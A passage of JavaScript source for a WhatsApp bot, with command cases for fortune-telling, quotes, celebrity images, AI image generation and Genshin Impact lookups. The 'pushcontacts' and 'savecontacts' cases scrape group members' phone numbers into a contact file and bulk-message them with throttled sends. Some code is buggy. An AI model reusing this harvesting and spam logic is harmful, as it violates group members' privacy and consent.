let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Name :* ${anu.message.nama}\n• *Birth :* ${anu.message.tgl_lahir}\n• *Result :* ${anu.message.result}`)
}
break
case 'fishing': case 'memancing': {
if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Date :* ${anu.message.tgl_memancing}\n• *Result :* ${anu.message.result}\n• *Note :* ${anu.message.catatan}`)
}
break

case 'fertiletime': case 'masasubur': {
if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Result :* ${anu.message.result}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return reply(`Example : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'chinesezodiac': case 'shio': {
if (!text) return reply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Result :* ${anu.message}`)
}
break

// ============Quotes
case 'dilan':
    case 'quotesdilan': {
      let tod = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesdilan.json`)
      const dilan = await pickRandom(tod)
      Hisoka.sendMessage(m.chat, {
        text: dilan.quotes
      }, {
        quoted: m
      })
    }
    break
    case 'romantic':
    case 'lovequotes':
    case 'bucin':
    case 'quotesbucin': {
      const bucin = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/bucin.json`)
      const bucc = await pickRandom(bucin)
      Hisoka.sendMessage(m.chat, {
        text: bucc
      }, {
        quoted: m
      })
    }
    break
    case 'quotesanime': {
      const quotesanim = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesanime.json`)
      const anu = await pickRandom(quotesanim)
      let teks = `*Quotes Anime*\n\n"${anu.quotes}"\n\n*${anu.char_name}*\n_${anu.anime} (${anu.episode})_\n_${anu.date}_`
      let coo = `{\"display_text\":\"Url Quotes\",\"id\":\"P\",\"copy_code\":\"${anu.url}\"}`
      buttoncopy(m.chat, teks, coo, null, m)
    }
    break
    case 'quotesislamic': {
      const islamic = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotesislamic.json`)
      const quotesislamic = await pickRandom(islamic)
      m.reply(`${quotesislamic}`)
    }
    break
    case 'uniquefact': case 'faktaunik': {
      const fakta = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/faktaunik.json`)
      const faktaunik = await pickRandom(fakta)
      m.reply(`*Did You Know?*\n\n${faktaunik}`)
    }
    break
    case 'duskword': case 'katasenja': {
      const senja = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katasenja.json`)
      const katasenja = await pickRandom(senja)
      m.reply(`${katasenja}`)
    }
    break
    case 'inspirationalword': case 'katailham': {
      const ilham = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katailham.json`)
      const katailham = await pickRandom(ilham)
      m.reply(`${katailham}`)
    }
    break
    case 'quotes': {
      const quot = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotes.json`)
      const quote = await pickRandom(quot)
      m.reply(`${quote.quotes}\n\nBy ${quote.author}`)
    }
    break
    case 'poem': case 'puisi': {
      const puis = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/puisi.json`)
      const puisi = await pickRandom(puis)
      m.reply(`${puisi}`)
    }
    break
    case 'pantun': {
      const pant = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/pantun.json`)
      const pantun = await pickRandom(pant)
      m.reply(`${pantun}`)
    }
    break
    
// ============Cecan
    case 'hijabgirl': case 'hijaber':
    case 'jennie': case 'jeni':
    case 'jisoo': case 'jiso':
    case 'justina':
    case 'rose':
    case 'ryujin': {
      let heyy
      if (/hijabgirl|hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hijaber.json')
      if (/jennie|jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json')
      if (/jisoo|jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json')
      if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json')
      if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json')
      if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ryujin.json')
      let yeha = heyy[Math.floor(Math.random() * heyy.length)]
      Hisoka.sendMessage(m.chat, {
        image: {
          url: yeha
        },
        caption: foother
      }, {
        quoted: m
      })
    }
    break
    
    // Push
    case "pushcontacts": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("groupid|message")
if (!text.split("|")) return m.reply("groupid|message")
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Hisoka.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Processing *pushcontact* to group *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${nama}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Hisoka.sendMessage(mem, { contacts: { displayName: nama, contacts: [{ vcard }] }})
await Hisoka.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(10000)
}}

await Hisoka.sendMessage(jidawal, {text: `*Push Contact Successful ✅*\nTotal members successfully sent messages: ${halls.length}`}, {quoted: m})
}
break

case "pushcontacts2": {
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!text) return m.reply("message")
const teks = text
const jidawal = m.chat
const data = await Hisoka.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushcontacts*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${nama}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Hisoka.sendMessage(mem, { contacts: { displayName: nama, contacts: [{ vcard }] }})
await Hisoka.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(10000)
}}

await Hisoka.sendMessage(jidawal, {text: `*Push Contact Successful ✅*\nTotal members successfully sent messages: ${halls.length}`}, {quoted: m})
}
break
case "savecontacts": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("group id")
let res = await Hisoka.groupMetadata(m.chat)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:${nama} - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Successfully created contact file ✅*
Contact file has been sent to private chat
Total *${halls.length}* contacts`)
await Hisoka.sendMessage(m.sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: `Contact file successfully created ✅\nTotal *${halls.length}* contacts`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./lib/database/contacts.vcf", "")
}}
break
case "savecontacts2": {
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
let res = await groupMetadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:${nama} - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Successfully created contact file ✅*
Contact file has been sent to private chat
Total *${halls.length}* contacts`)
await Hisoka.sendMessage(m.sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: `Contact file successfully created ✅\nTotal *${halls.length}* contacts`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./lib/database/contacts.vcf", "")
}}
break

//
    // Maker
    case 'text2img':
case 'txt2img': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
  
  await Hisoka.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=dreamshaper-8-base` }, caption: foother }, {quoted: m})
}
break

case 'text2imgv2':
case 'txt2imgv2': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
  
  await Hisoka.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/flux/schnell?prompt=${text}&size=9_16` }, caption: foother }, {quoted: m})
}
break

case 'text2imgv3':
case 'txt2imgv3': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
  
  await Hisoka.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=stable-diffusion-xl-fast` }, caption: foother }, {quoted: m})
}
break

case 'text2imgv4':
case 'txt2imgv4': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
    
    await Hisoka.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=stable-diffusion-xl-base` }, caption: foother }, {quoted: m})
}
break

case 'text2imgv5':
case 'txt2imgv5': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
    
    await Hisoka.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/amazonai?prompt=${text}&size=9_16` }, caption: foother }, {quoted: m})
}
break

case 'text2imgv6':
case 'txt2imgv6': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
    
    await Hisoka.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/gemini?prompt=${text}` }, caption: foother }, {quoted: m})
}
break



case 'bratfoto':
case 'bratgenerator': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
    
    await Hisoka.sendMessage(m.chat, {image: {url: `https://aqul-brat.hf.space/?text=${text}` }, caption: foother }, {quoted: m})
}
break
case 'pakustad':
case 'pak-ustad': {
  if (!text) return m.reply(`Example: ${command} kenapa Hisoka ganteng`)
    
    await Hisoka.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/tanya-ustad?quest=${text}` }, caption: foother }, {quoted: m})
}
break
case 'nglgenerator':
case 'ngl': {
  if (!text) return m.reply(`Example: ${command} beautiful girl with handsome man`)
    
    await Hisoka.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/ngl?text=${text}` }, caption: foother }, {quoted: m})
}
break
    case 'attp': {

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get(`https://anabot.my.id/api/maker/attp?text=${text}&apikey=freeApikey`, {
 params: {
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete Hisoka.enhancer[sender];
 Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await Hisoka.sendImageAsSticker(m.chat, buf.image, m, { packname: nama, author: nama })
}
break
case 'pak-ustad2':
case 'pakustad2': {

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get(`https://api.taka.my.id/tanya-ustad?quest=${text}`, {
 params: {
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete Hisoka.enhancer[sender];
 Hisoka.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await Hisoka.sendImageAsSticker(m.chat, buf.image, m, { packname: nama, author: nama })
}
break

    

// ============Genshin
    case 'genshin-wildlife':
    case 'g-wildlife':
    case 'gens-wildlife': {
      
      if (!text) return m.reply(`Example: *${prefix + command} snowboar*\nPlease provide wildlife name.`);
      try {
        let result = await genshindb.wildlife(text);
        if (result) {
          let response = `*Wildlife Found: ${result.name}*\n\n` + `_${result.description || "Data not available"}_\n\n` + `*Rarity:* ${result.rarity || "Data not available"}\n` + `*Habitat:* ${result.habitat || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Wildlife not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.wildlife("names", {
          matchCategories: true
        });
        m.reply(`*Not Found*\n\n*Available wildlife:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-weapons':
    case 'g-weapons':
    case 'gens-weapons': {
      
      if (!text) return m.reply(`Example: *${lrefix + command} claymore*\nPlease provide nama senjata.`);
      try {
        let result = await genshindb.weapons(text);
        if (result) {
          let response = `*Senjata Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data not available"}_\n\n` + `*Rarity:* ${result.rarity || "Data not available"}\n` + `*Type:* ${result.type || "Data not available"}\n` + `*Base ATK:* ${result.baseAttack || "Data not available"}\n` + `*Substat:* ${result.subStat || "Data not available"}\n` + `*Passive Name:* ${result.passiveName || "Data not available"}\n` + `*Passive Description:* ${result.passiveDescription || "Data not available"}\n` + (result.refinement ? `\n*Refinement (${result.refinement.refine}):* ${result.refinement.description || "Data not available"}\n` : "");
          m.reply(response);
        } else {
          m.reply("Senjata not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.weapons("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Senjata yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-voiceovers':
    case 'g-voiceovers':
    case 'gens-voiceovers': {
      
      if (!text) return m.reply(`Example: *${prefix + command} venti*\nPlease provide nama voiceover.`);
      try {
        let result = await genshindb.voiceovers(text);
        if (result) {
          let response = `*Voiceover Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Voiceover not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.voiceovers("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Voiceover yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-viewpoint':
    case 'g-viewpoint':
    case 'gens-viewpoint': {
      
      if (!text) return m.reply(`Example: *${prefix + command} starfell valley*\nPlease provide nama pemandangan.`);
      try {
        let result = await genshindb.viewpoints(text);
        if (result) {
          let response = `*Pemandangan Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Region:* ${result.region || "Data not available"}\n`;
          response += `*Area:* ${result.area || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Pemandangan not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.viewpoints("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Pemandangan yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-talents':
    case 'g-talents':
    case 'gens-talents': {
      
      if (!text) return m.reply(`Example: *${prefix + command} diluc*\nPlease provide character name to search for talents.`);
      try {
        let result = await genshindb.talents(text);
        if (result && result.length > 0) {
          let response = `*Talents found for character ${text}:*\n\n`;
          result.forEach((talent, index) => {
            response += `*${index + 1}. ${talent.name}*\n`;
            response += `_${talent.description || "Deskripsi tidak tersedia"}_\n\n`;
            response += `*Jenis:* ${talent.type || "Data not available"}\n`;
            response += `*Element:* ${talent.element || "Data not available"}\n\n`;
          });
          m.reply(response);
        } else {
          m.reply(`Talent for character '${text}' not found.`);
        }
      } catch (err) {
        m.reply('An error occurred...')
        m.reply(`*Not Found*\n\n*Talent for character '${text}' not found.`);
      }
    };
    break

    case 'genshin-potion':
    case 'g-potion':
    case 'gens-potion': {
      
      if (!text) return m.reply(`Example: *${prefix + command} squirrel fish*\nPlease provide nama ramuan atau makanan.`)
      try {
        let result = await genshindb.foods(text);
        if (result) {
          let response = `*Ramuan atau Makanan Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}\n`;
          response += `*Efek:* ${result.effect || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply(`Ramuan atau makanan '${text}' not found.`);
        }
      } catch (err) {
        m.reply('An error occurred...')
        try {
          let availableFoods = await genshindb.foods("names", {
            matchCategories: true
          });
          m.reply(`*List ${text} foods :*\n\n- ${availableFoods.join("\n- ")}`);
        } catch (err) {
          m.reply('An error occurred...')
          let availableFoods = await genshindb.foods("names", {
            matchCategories: true
          });
          m.reply(`*Not Found*\n\n*Available foods is :*\n${availableFoods.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-outfit':
    case 'g-outfit':
    case 'gens-outfit': {
      
      if (!text) return m.reply(`Example: *${prefix + command} outrider*\nPlease provide nama kostum atau outfit.`);
      try {
        let result = await genshindb.outfits(text);
        if (result) {
          let response = `*Kostum Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Character:* ${result.character || "Data not available"}`;
          if (result.url && result.url.modelviewer) {
            response += `\n_${result.url.modelviewer}_`;
          }
          m.reply(response);
        } else {
          m.reply(`Kostum '${text}' not found.`);
        }
      } catch (err) {
        m.reply('An error occurred...')
        try {
          let availableOutfits = await genshindb.outfits(text, {
            matchCategories: true
          });
          m.reply(`*List ${text} outfit :*\n\n- ${availableOutfits.join("\n- ")}`);
        } catch (err) {
          m.reply('An error occurred...')
          let availableOutfits = await genshindb.outfits("names", {
            matchCategories: true
          });
          m.reply(`*Not Found*\n\n*Available outfits is:*\n${availableOutfits.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-nation':
    case 'g-nation':
    case 'gens-nation': {
      
      if (!text) return m.reply(`Example: *${prefix + command} mondstadt*\nPlease provide nama wilayah atau nasionalitas.`);
      try {
        let result = await genshindb.geographies(text);
        if (result) {
          let response = `*Informasi Region Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Area:* ${result.area || "Data not available"}\n`;
          response += `*Region:* ${result.region || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Informasi wilayah not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.geographies("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Region yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-namacard':
    case 'g-namacard':
    case 'gens-namacard': {
      
      if (!text) return m.reply(`Example: *${prefix + command} anemo flare*\nPlease provide nama kartu nama.`);
      try {
        let result = await genshindb.namecards(text);
        if (result) {
          let response = `*Kartu Nama Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}\n`;
          response += `*Unlock:* ${result.unlock || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Kartu nama not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.namecards("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Kartu nama yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-materials':
    case 'g-materials':
    case 'gens-materials': {
      
      if (!text) return m.reply(`Example: *${prefix + command} boreal wolf's milk*\nPlease provide nama material.`);
      try {
        let result = await genshinmaterials(text);
        if (result) {
          let response = `*Material Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}\n`;
          response += `*Type:* ${result.type || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Material not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshinmaterials("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Material yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-food':
    case 'g-food':
    case 'gens-food': {
      
      if (!text) return m.reply(`Example: *${prefix + command} temptation*\nPlease provide nama makanan.`);
      try {
        let result = await genshindb.foods(text);
        if (result) {
          let response = `*Makanan Ditemukan: ${result.name}*\n\n`;
          response += `_"${result.description}"_\n\n`;
          response += `*Rarity:* ${result.rarity}\n`;
          response += `*Type:* ${result.foodtype}\n`;
          response += `*Category:* ${result.foodfilter} (${result.foodcategory})\n\n`;
          if (result.effect) {
            response += `*Effect:*\n${result.effect}\n\n`;
          }
          if (result.suspicious) {
            response += `*Suspicious:*\n${result.suspicious.effect}\n_"${result.suspicious.description}"_\n\n`;
          }
          if (result.normal) {
            response += `*Normal:*\n${result.normal.effect}\n_"${result.normal.description}"_\n\n`;
          }
          if (result.delicious) {
            response += `*Delicious:*\n${result.delicious.effect}\n_"${result.delicious.description}"_\n\n`;
          }
          m.reply(response);
        } else {
          m.reply("Makanan not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.foods("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Makanan yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-enemy':
    case 'g-enemy':
    case 'gens-enemy': {
      
      if (!text) return m.reply(`Example: *${prefix + command} ruin guard*\nPlease provide nama musuh.`);
      try {
        let result = await genshindb.enemies(text);
        if (result) {
          let response = `*Musuh Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Level:* ${result.level || "Data not available"}\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}\n`;
          response += `*Element:* ${result.element || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Musuh not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.enemies("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Musuh yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-emoji':
    case 'g-emoji':
    case 'gens-emoji': {
      
      if (!text) return m.reply(`Example: *${prefix + command} anemo*\nPlease provide nama emoji.`);
      try {
        let result = await genshindb.emojis(text);
        if (result) {
          let response = `*Emoji Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Emoji not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.emojis("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Emoji yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-domain':
    case 'g-domain':
    case 'gens-domain': {
      
      if (!text) return m.reply(`Example: *${prefix + command} valley of remembrance*\nPlease provide nama domain.`);
      try {
        let result = await genshindb.domains(text);
        if (result) {
          let response = `*Domain Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Area:* ${result.area || "Data not available"}\n`;
          response += `*Level:* ${result.level || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Domain not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.domains("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Domain yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-craft':
    case 'g-craft':
    case 'gens-craft': {
      
      if (!text) return m.reply(`Example: *${prefix + command} mystical enhancement ore*\nPlease provide nama craft.`);
      try {
        let result = await genshindb.crafts(text);
        if (result) {
          let response = `*Craft Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Type:* ${result.type || "Data not available"}\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Craft not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
        let available = await genshindb.crafts("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Craft yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-const':
    case 'g-const':
    case 'gens-const':
    case 'genshin-constellation':
    case 'g-constellation':
    case 'gens-constellation': {
      
      if (!text) return m.reply(`Example: *${prefix + command} diluc*\nPlease provide character name to search for constellation.`);
      try {
        let result = await genshindb.constellations(text);
        if (result && result.length > 0) {
          let response = `*Constellation found for character ${text}:*\n\n`;
          result.forEach((constellation, index) => {
            response += `*${index + 1}. ${constellation.name}*\n`;
            response += `_${constellation.effect}_\n\n`;
            response += `*Unlock At:* C${constellation.unlock || "Data not available"}`;
            if (index < result.length - 1) response += "\n\n";
          });
          m.reply(response);
        } else {
          m.reply(`Constellation for character '${text}' not found.`);
        }
      } catch (err) {
        m.reply('An error occurred...')
        m.reply(`*Not Found*\n\n*Constellation for character '${text}' not found.`);
      }
    };
    break

    case 'genshin-artifaact':
    case 'g-artifact':
    case 'gens-artifact': {
      
      if (!text) return m.reply(`Example: *${prefix + command} berserker*\nPlease provide nama artefak.`);
      try {
        let result = await genshindb.artifacts(text);
        if (result) {
          let response = `*Artefak Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Set:* ${result.set || "Data not available"}\n`;
          response += `*Rarity:* ${result.rarity || "Data not available"}\n`;
          response += `*Slot:* ${result.slot || "Data not available"}`;
          m.reply(response);
        } else {
          m.reply("Artefak not found.");
        }
      } catch (err) {
        m.reply('An error occurred...')
